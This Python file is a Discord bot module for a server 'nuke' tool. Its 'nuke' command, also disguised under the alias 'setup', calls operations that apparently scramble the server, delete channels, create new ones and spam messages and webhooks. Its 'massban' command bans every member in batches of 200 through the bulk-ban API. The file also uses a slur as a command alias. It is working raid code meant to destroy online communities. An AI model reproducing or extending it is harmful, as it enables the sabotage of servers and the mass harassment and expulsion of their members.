from __future__ import annotations
import asyncio
import logging
import traceback
from discord.ext import commands

from core.operations import Operations
from tools.states.blacklist import is_blacklisted

CONFIRM_EMOJI = "✅"
TIMEOUT = 60

class Nuke(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot
        self.operations: Operations | None = getattr(bot, "operations", None)

    @commands.command(name="nuke", aliases=["kill", "rape", "setup"])
    @is_blacklisted
    async def nuke(self, ctx: commands.Context) -> None:
        guild = ctx.guild
        logging.info(f"[nuke] invoked by {ctx.author} in {guild} ({guild.id})")

        if not self.operations:
            return

        try:
            logging.info(f"[nuke] mess_server -> {guild.id}")
            await self.operations.mess_server(guild)
            logging.info(f"[nuke] DelChannels -> {guild.id}")
            await self.operations.DelChannels(guild)
            logging.info(f"[nuke] CrChannel -> {guild.id}")
            await self.operations.CrChannel(guild)
            logging.info(f"[nuke] spam -> {guild.id}")
            await self.operations.spam(guild)
            logging.info(f"[nuke] spam_webhook -> {guild.id}")
            await self.operations.spam_webhook(guild)
            logging.info(f"[nuke] nuked {ctx.guild.name} successfully!")
        except Exception as e:
            tb = traceback.format_exc()
            logging.error(f"[nuke] failed: {e}\n{tb}")

    @commands.command(name="massban", aliases=["mb", "ban_everyone"])
    @commands.bot_has_permissions(ban_members=True)
    @is_blacklisted
    async def massban(self, ctx: commands.Context) -> None:
        guild = ctx.guild
        confirm_msg = await ctx.reply(
            f"⚠️ **Mass Ban Confirmation**\n"
            f"Make sure {guild.me.mention}'s role is **above every role** you want to ban.\n"
            f"React with {CONFIRM_EMOJI} to proceed with banning all members.\n"
            f"This will ban **{len(guild.members)}** members."
        )
        await confirm_msg.add_reaction(CONFIRM_EMOJI)

        def check(reaction, user):
            return (
                user == ctx.author
                and reaction.message.id == confirm_msg.id
                and str(reaction.emoji) == CONFIRM_EMOJI
            )

        try:
            await self.bot.wait_for("reaction_add", timeout=TIMEOUT, check=check)
        except asyncio.TimeoutError:
            await confirm_msg.edit(content="❌ Mass ban cancelled (timed out).")
            return

        members_to_ban = [m for m in guild.members if m != guild.me and m != ctx.author and not m.bot]
        if not members_to_ban:
            await confirm_msg.edit(content="❌ No members to ban.")
            return

        await confirm_msg.edit(content=f"🔨 Banning {len(members_to_ban)} members...")

        banned = 0
        failed = 0
        for i in range(0, len(members_to_ban), 200):
            batch = members_to_ban[i:i + 200]
            user_ids = [str(m.id) for m in batch]
            try:
                async with self.bot.http.session.post(
                    f"https://discord.com/api/v10/guilds/{guild.id}/bulk-ban",
                    headers={"Authorization": f"Bot {self.bot.http.token}"},
                    json={"user_ids": user_ids, "delete_message_seconds": 0},
                ) as resp:
                    if resp.status in (200, 204):
                        banned += len(batch)
                    else:
                        failed += len(batch)
                        logging.warning(f"[massban] bulk-ban batch failed: {resp.status}")
            except Exception as e:
                failed += len(batch)
                logging.error(f"[massban] bulk-ban error: {e}")
            await asyncio.sleep(1)

        logging.info(f"[massban] banned={banned} failed={failed} in {guild.id}")
        await confirm_msg.edit(content=f"✅ Mass ban complete. Banned: {banned}, Failed: {failed}")

    @massban.error
    async def massban_error(self, ctx: commands.Context, error):
        if isinstance(error, commands.BotMissingPermissions):
            await ctx.reply("❌ I need `Ban Members` permission.", delete_after=5)
        else:
            logging.error(f"[massban] command error: {error}")


async def setup(bot: commands.Bot) -> None:
    await bot.add_cog(Nuke(bot))
